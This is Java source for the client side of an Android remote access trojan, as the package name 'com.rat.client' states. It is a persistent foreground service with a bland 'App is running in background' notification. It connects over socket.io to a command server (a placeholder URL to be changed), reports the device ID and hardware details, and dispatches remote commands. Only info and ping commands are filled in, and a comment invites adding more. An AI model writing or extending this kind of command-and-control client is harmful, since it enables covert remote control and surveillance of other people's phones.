package com.rat.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class BackgroundService extends Service {

    private static final String CHANNEL_ID = "RATServiceChannel";
    private Socket socket;
    private String serverUrl = "http://localhost:5000"; // Change to your server URL

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, createNotification());
        connectToServer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service Running")
            .setContentText("App is running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    private void connectToServer() {
        try {
            socket = IO.socket(serverUrl);
            
            socket.on(Socket.EVENT_CONNECT, args -> {
                try {
                    JSONObject data = new JSONObject();
                    data.put("deviceId", getDeviceId());
                    data.put("userId", "user@example.com");
                    data.put("deviceInfo", getDeviceInfo());
                    socket.emit("device:connect", data);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            socket.on("device:command", args -> {
                try {
                    JSONObject command = (JSONObject) args[0];
                    handleCommand(command);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });

            socket.connect();
            
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    private String getDeviceId() {
        return android.provider.Settings.Secure.getString(
            getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        );
    }

    private JSONObject getDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            return info;
        } catch (Exception e) {
            return new JSONObject();
        }
    }

    private void handleCommand(JSONObject command) {
        try {
            String cmd = command.getString("command");
            
            // Handle different commands
            switch (cmd) {
                case "getDeviceInfo":
                    sendResponse(getDeviceInfo());
                    break;
                case "ping":
                    JSONObject pong = new JSONObject();
                    pong.put("status", "online");
                    sendResponse(pong);
                    break;
                // Add more command handlers here
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendResponse(JSONObject response) {
        try {
            JSONObject data = new JSONObject();
            data.put("userId", "user@example.com");
            data.put("response", response);
            socket.emit("device:response", data);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (socket != null) {
            socket.disconnect();
        }
    }
}
